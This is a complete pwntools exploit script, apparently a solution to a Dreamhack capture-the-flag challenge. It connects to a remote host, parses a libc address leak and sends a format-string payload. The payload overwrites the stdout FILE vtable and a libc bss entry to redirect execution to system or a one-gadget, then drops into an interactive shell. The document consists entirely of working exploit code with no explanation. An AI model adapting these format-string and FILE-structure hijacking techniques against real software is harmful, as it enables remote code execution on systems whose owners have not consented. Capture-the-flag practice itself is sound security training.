#!/usr/bin/python3
from pwn import *

# context.log_level='debug'
name = "./vuln"
context.binary = exe = ELF(name, checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# p = process(exe.path)
p = remote('host8.dreamhack.games', 49327)

# gdb.attach(p, gdbscript='''
#         b*main+148
#         c
#                 ''' )

p.recvuntil(b'Clue: ')
libc_leak = int(p.recvline()[:-1], 16)
addr_vtable = libc_leak + 216
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
addr_write = libc_leak + 0xe0

dic = {
    libc_leak : u64(b'sh\0\0\0\0\0\0'),
    addr_write : libc.sym.system,
    libc_leak + 0xd8 : addr_write - 0x18,
}

bytes_to_write = (libc.sym['_IO_file_jumps'] & 0xffff) + 0x2010
 
log.info(hex(libc.bss() + 0x8))

dic = {
    # libc_leak : u64(b'sh\0\0\0\0\0\0'), 
    libc.bss()+0x8 : libc.address + 0x4527a, 
    libc.sym['_IO_2_1_stdout_']+216 : p16(bytes_to_write)
}

payload = fmtstr_payload(8, dic, no_dollars=True)
log.info(len(payload))
# payload = payload.replace(b'cccccccc', p64(libc.bss()+0x18)) 

p.sendlineafter(b'path', payload)

p.interactive()

